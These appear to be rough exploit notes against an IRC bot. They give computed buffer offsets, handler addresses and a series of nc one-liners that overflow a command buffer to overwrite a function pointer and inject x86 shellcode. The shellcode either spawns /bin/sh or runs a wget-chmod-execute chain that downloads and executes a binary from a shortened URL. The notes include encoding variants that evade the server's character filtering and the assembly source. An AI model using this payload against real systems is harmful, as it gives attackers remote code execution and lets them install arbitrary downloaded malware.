makes bot crash (MAX_CMD_LEN is 32, and the data is checked against that) :
(  sleep 2 ; echo NICK $USER;  echo USER $USER $USER $USER :$USER;  sleep 1;  echo "JOIN $CHANNEL";  sleep 1;  echo "PRIVMSG $DEST" :`python -c 'print "!" + "X" * 42'`;  echo "QUIT";  ) | nc $IRC_SERVER $IRC_PORT

handlers :
0x8048917
0x80488bb
0x804893a
0x80488f0

next param :   0x804b120
handler list : 0x804b160

MAX_CMD_LEN  32

objective : override one of the handler address to start of buff (in next_param)

32 bytes buff
+ 32 bytes ??
+ (40 x 3) bytes (3 Handler structures)
- 4 byte (override handler address of last structure)
= 180 bytes (0xb4)

0x804b120 (start of buff) + 0xb4 = 0x804b1d4

// first, override join callback address

(  sleep 2 ; echo NICK $USER;  echo USER $USER $USER $USER :$USER;  sleep 1;  echo "JOIN $CHANNEL";  sleep 1;  echo "PRIVMSG $DEST" :`python -c 'print "!" + "A"*139 + "\x21\xb1\x04\x08" + "PRIVMSG\x00"'`; echo "PRIVMSG $DEST" :`python -c 'print "!" + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "A"*65 + "PRIVMSG\x00"'` ; echo "PRIVMSG $DEST" :`python -c "print 'pls_crash'"` ; echo "QUIT";  ) | nc $IRC_SERVER $IRC_PORT


shellcode to download script to execute and execute : (92 bytes)
\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x77\x67\x65\x74\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x2e\x67\x6c\x2f\x61\x66\x62\x41\x41\x6e\x20\x26\x26\x20\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20\x69\x72\x63\x5f\x65\x78\x65\x63\x20\x26\x26\x20\x2e\x2f\x69\x72\x63\x5f\x65\x78\x65\x63

(  sleep 2 ; echo NICK $USER;  echo USER $USER $USER $USER :$USER;  sleep 1;  echo "JOIN $CHANNEL";  sleep 1;  echo "PRIVMSG $DEST" :`python -c 'print "!" + "A"*139 + "\x21\xb1\x04\x08" + "PRIVMSG\x00"'`; echo "PRIVMSG $DEST" :`python -c 'print "!" + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x77\x67\x65\x74\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x2e\x67\x6c\x2f\x61\x66\x62\x41\x41\x6e\x20\x26\x26\x20\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20\x69\x72\x63\x5f\x65\x78\x65\x63\x20\x26\x26\x20\x2e\x2f\x69\x72\x63\x5f\x65\x78\x65\x63" + "A"*11 + "PRIVMSG\x00"'` ; echo "PRIVMSG $DEST" :`python -c "print 'pls_crash'"` ; echo "QUIT";  ) | nc $IRC_SERVER $IRC_PORT


actual good one (4 less bytes)
\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x77\x67\x65\x74\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x2e\x67\x6c\x2f\x61\x66\x62\x41\x41\x6e\x20\x26\x26\x20\x63\x68\x6d\x6f\x64\x20\x2b\x78\x20\x61\x66\x62\x41\x41\x6e\x20\x26\x26\x20\x2e\x2f\x61\x66\x62\x41\x41\x6e

same, but with tabs instead of spaces:
\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x77\x67\x65\x74\x09\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x2e\x67\x6c\x2f\x61\x66\x62\x41\x41\x6e\x09\x26\x26\x09\x63\x68\x6d\x6f\x64\x09\x2b\x78\x09\x61\x66\x62\x41\x41\x6e\x09\x26\x26\x09\x2e\x2f\x61\x66\x62\x41\x41\x6e

same, but with 0b instead of spaces:
\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x77\x67\x65\x74\x0b\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x2e\x67\x6c\x2f\x61\x66\x62\x41\x41\x6e\x0b\x26\x26\x0b\x63\x68\x6d\x6f\x64\x0b\x2b\x78\x0b\x61\x66\x62\x41\x41\x6e\x0b\x26\x26\x0b\x2e\x2f\x61\x66\x62\x41\x41\x6e


(  sleep 2 ; echo NICK $USER;  echo USER $USER $USER $USER :$USER;  sleep 1;  echo "JOIN $CHANNEL";  sleep 1;  echo "PRIVMSG $DEST" :`python -c 'print "!" + "A"*139 + "\x21\xb1\x04\x08" + "PRIVMSG\x00"'`; echo "PRIVMSG $DEST" :`python -c 'print "!" + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x77\x67\x65\x74\x09\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x2e\x67\x6c\x2f\x61\x66\x62\x41\x41\x6e\x09\x26\x26\x09\x63\x68\x6d\x6f\x64\x09\x2b\x78\x09\x61\x66\x62\x41\x41\x6e\x09\x26\x26\x09\x2e\x2f\x61\x66\x62\x41\x41\x6e" + "A"*15 + "PRIVMSG\x00"'` ; echo "PRIVMSG $DEST" :`python -c "print 'pls_crash'"` ) | nc $IRC_SERVER $IRC_PORT

(  sleep 2 ; echo NICK $USER;  echo USER $USER $USER $USER :$USER;  sleep 1;  echo "JOIN $CHANNEL";  sleep 1;  echo "PRIVMSG $DEST" :`python -c 'print "!" + "A"*139 + "\x21\xb1\x04\x08" + "PRIVMSG\x00"'`; echo "PRIVMSG $DEST" :`python -c 'print "!" + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x77\x67\x65\x74\x0b\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x2e\x67\x6c\x2f\x61\x66\x62\x41\x41\x6e\x0b\x26\x26\x0b\x63\x68\x6d\x6f\x64\x0b\x2b\x78\x0b\x61\x66\x62\x41\x41\x6e\x0b\x26\x26\x0b\x2e\x2f\x61\x66\x62\x41\x41\x6e" + "A"*15 + "PRIVMSG\x00"'` ; echo "PRIVMSG $DEST" :`python -c "print 'pls_crash'"` ) | nc $IRC_SERVER $IRC_PORT



the irc server transform all \t \n (and others) to spaces, which prevents us to send a command, so we will 'encrypt' our command and decrypt it at runtime (rot1)


shellcode:

jmp short    mycall               ; Immediately jump to the call instruction

shellcode:
    pop        esi                ; Store the address of "/bin/sh" in ESI
    xor        eax, eax           ; Zero out EAX
    mov byte   [esi + 57], al      ; Write the null byte at the end of the string

    mov dword  [esi + 58],  esi    ; [ESI+8], i.e. the memory immediately below the string
                                  ;   "/bin/sh", will contain the array pointed to by the
                                  ;   second argument of execve(2); therefore we store in
                                  ;   [ESI+8] the address of the string...
    mov dword  [esi + 62], eax    ; ...and in [ESI+12] the NULL pointer (EAX is 0)
    mov        al,  0xb           ; Store the number of the syscall (11) in EAX
    lea        ebx, [esi]         ; Copy the address of the string in EBX
    lea        ecx, [esi + 58]     ; Second argument to execve(2)
    lea        edx, [esi + 62]    ; Third argument to execve(2) (NULL pointer)
    int        0x80               ; Execute the system call

mycall:
    call       shellcode          ; Push the address of "/bin/sh" onto the stack
    db         "wget https://goo.gl/afbAAn && chmod +x afbAAn && ./afbAAn"

